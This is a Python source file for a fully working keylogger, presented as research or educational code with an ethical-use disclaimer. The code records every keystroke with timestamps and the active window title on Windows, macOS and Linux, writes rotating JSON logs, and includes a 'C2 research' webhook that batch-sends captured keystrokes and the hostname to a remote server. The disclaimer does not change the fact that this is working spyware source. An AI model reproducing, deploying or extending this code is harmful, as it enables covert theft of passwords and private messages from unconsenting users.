"""
keylogger.py — Cybersecurity Research / Educational Keylogger
=============================================================
Features:
  - Real-time keyboard capture with microsecond timestamps
  - Active window tracking (Windows / macOS / Linux)
  - Log rotation at configurable size limit (default 5 MB)
  - F9 toggle: pause / resume capture at runtime
  - Webhook delivery simulation (C2 research)
  - Thread-safe with proper resource locking and cleanup

ETHICAL USE ONLY — only run on systems you own or have explicit
written permission to monitor. Unauthorised use is illegal.
"""

import os
import sys
import json
import time
import queue
import signal
import threading
import datetime
import platform
import logging
from pathlib import Path
from typing import Optional

# ── Third-party deps (pip install pynput requests psutil) ────────────────────
try:
    from pynput import keyboard
except ImportError:
    sys.exit("[!] pynput not found — run: pip install pynput")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# ── Configuration ─────────────────────────────────────────────────────────────
CONFIG = {
    "log_dir":        Path("logs"),
    "log_basename":   "keylog",
    "max_log_size":   5 * 1024 * 1024,   # 5 MB per file
    "flush_interval": 2.0,               # seconds between disk flushes
    "webhook_url":    None,              # e.g. "https://your-server/endpoint"
    "webhook_batch":  20,                # events per webhook POST
    "toggle_key":     keyboard.Key.f9,   # pause/resume hotkey
}

# ── Globals ───────────────────────────────────────────────────────────────────
_lock         = threading.Lock()
_event_queue  = queue.Queue()
_paused       = threading.Event()        # set = paused
_stop_event   = threading.Event()
_log_file: Optional[object] = None
_log_path: Optional[Path]   = None
_log_index    = 0
_webhook_buf  = []

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("keylogger")

# ── Active window helper ──────────────────────────────────────────────────────
def get_active_window() -> str:
    """Return the title of the currently focused window (best-effort)."""
    system = platform.system()
    try:
        if system == "Windows":
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Unknown"

        elif system == "Darwin":
            from AppKit import NSWorkspace          # type: ignore
            app = NSWorkspace.sharedWorkspace().activeApplication()
            return app.get("NSApplicationName", "Unknown")

        elif system == "Linux":
            # Requires xdotool: apt install xdotool
            import subprocess
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=0.3,
            )
            return result.stdout.strip() or "Unknown"
    except Exception:
        pass
    return "Unknown"


# ── Log file management ───────────────────────────────────────────────────────
def _open_new_log() -> None:
    global _log_file, _log_path, _log_index
    CONFIG["log_dir"].mkdir(parents=True, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    _log_path = CONFIG["log_dir"] / f"{CONFIG['log_basename']}_{ts}_{_log_index:03d}.jsonl"
    _log_file = _log_path.open("a", encoding="utf-8")
    _log_index += 1
    log.info("Opened log file: %s", _log_path)


def _rotate_if_needed() -> None:
    """Rotate the log file if it exceeds max_log_size."""
    if _log_file and _log_path and _log_path.stat().st_size >= CONFIG["max_log_size"]:
        log.info("Rotating log (size limit reached)")
        _log_file.close()
        _open_new_log()


def _write_entry(entry: dict) -> None:
    """Write one JSON-Lines entry to disk (caller holds _lock)."""
    global _log_file
    if _log_file is None:
        _open_new_log()
    _log_file.write(json.dumps(entry) + "\n")
    _rotate_if_needed()


# ── Webhook delivery simulation ───────────────────────────────────────────────
def _send_webhook(events: list) -> None:
    """POST a batch of events to the configured webhook (fire-and-forget)."""
    if not REQUESTS_AVAILABLE or not CONFIG["webhook_url"]:
        return
    payload = {"source": platform.node(), "events": events}
    try:
        r = requests.post(CONFIG["webhook_url"], json=payload, timeout=5)
        log.debug("Webhook response: %s", r.status_code)
    except Exception as exc:
        log.warning("Webhook delivery failed: %s", exc)


# ── Writer thread ─────────────────────────────────────────────────────────────
def _writer_thread() -> None:
    """Drain the event queue, write to disk, and batch-deliver via webhook."""
    global _webhook_buf
    last_flush = time.monotonic()

    while not _stop_event.is_set() or not _event_queue.empty():
        # Collect up to 50 events or wait up to flush_interval
        batch = []
        deadline = time.monotonic() + CONFIG["flush_interval"]
        while time.monotonic() < deadline:
            try:
                entry = _event_queue.get(timeout=0.1)
                batch.append(entry)
                if len(batch) >= 50:
                    break
            except queue.Empty:
                break

        if not batch:
            continue

        with _lock:
            for entry in batch:
                _write_entry(entry)
            _log_file.flush()

        # Webhook batching
        if CONFIG["webhook_url"]:
            _webhook_buf.extend(batch)
            if len(_webhook_buf) >= CONFIG["webhook_batch"]:
                threading.Thread(
                    target=_send_webhook, args=(_webhook_buf[:],), daemon=True
                ).start()
                _webhook_buf = []

    # Final flush
    with _lock:
        if _log_file:
            _log_file.flush()
            _log_file.close()
            log.info("Log file closed: %s", _log_path)

    if _webhook_buf and CONFIG["webhook_url"]:
        _send_webhook(_webhook_buf)


# ── Keyboard listener callbacks ───────────────────────────────────────────────
_last_window   = ""
_window_check  = 0.0

def _make_entry(event_type: str, key) -> dict:
    """Build a structured log entry for a key event."""
    global _last_window, _window_check

    # Rate-limit window title lookups (every 1 second)
    now = time.time()
    if now - _window_check > 1.0:
        _last_window  = get_active_window()
        _window_check = now

    # Human-readable key representation
    try:
        key_str = key.char if hasattr(key, "char") and key.char else f"[{key.name}]"
    except AttributeError:
        key_str = f"[{key}]"

    return {
        "ts":      datetime.datetime.utcnow().isoformat() + "Z",
        "ts_us":   time.time(),          # microsecond float for sorting
        "type":    event_type,           # "press" | "release"
        "key":     key_str,
        "window":  _last_window,
        "host":    platform.node(),
        "os":      platform.system(),
    }


def on_press(key) -> None:
    # Toggle pause/resume
    if key == CONFIG["toggle_key"]:
        if _paused.is_set():
            _paused.clear()
            log.info("▶  Capture RESUMED (F9)")
        else:
            _paused.set()
            log.info("⏸  Capture PAUSED (F9)")
        return

    if _paused.is_set():
        return

    _event_queue.put(_make_entry("press", key))


def on_release(key) -> None:
    if _paused.is_set():
        return
    _event_queue.put(_make_entry("release", key))


# ── Graceful shutdown ─────────────────────────────────────────────────────────
def _shutdown(signum=None, frame=None) -> None:
    log.info("Shutting down…")
    _stop_event.set()


signal.signal(signal.SIGINT,  _shutdown)
signal.signal(signal.SIGTERM, _shutdown)


# ── Entry point ───────────────────────────────────────────────────────────────
def main() -> None:
    log.info("=" * 60)
    log.info("  Keylogger — RESEARCH / EDUCATIONAL USE ONLY")
    log.info("  Platform : %s %s", platform.system(), platform.release())
    log.info("  Log dir  : %s", CONFIG['log_dir'].resolve())
    log.info("  Rotation : %d MB", CONFIG['max_log_size'] // 1_048_576)
    log.info("  Toggle   : F9  (pause / resume)")
    log.info("  Stop     : Ctrl-C")
    log.info("=" * 60)

    if not PSUTIL_AVAILABLE:
        log.warning("psutil not installed — process info unavailable (pip install psutil)")
    if not REQUESTS_AVAILABLE:
        log.warning("requests not installed — webhook delivery disabled (pip install requests)")

    # Start the writer thread
    writer = threading.Thread(target=_writer_thread, daemon=False, name="writer")
    writer.start()

    # Start the keyboard listener (blocking until _stop_event is set)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        _stop_event.wait()          # block until Ctrl-C / SIGTERM
        listener.stop()

    writer.join(timeout=10)
    log.info("Done. Log saved to: %s", CONFIG['log_dir'].resolve())


if __name__ == "__main__":
    main()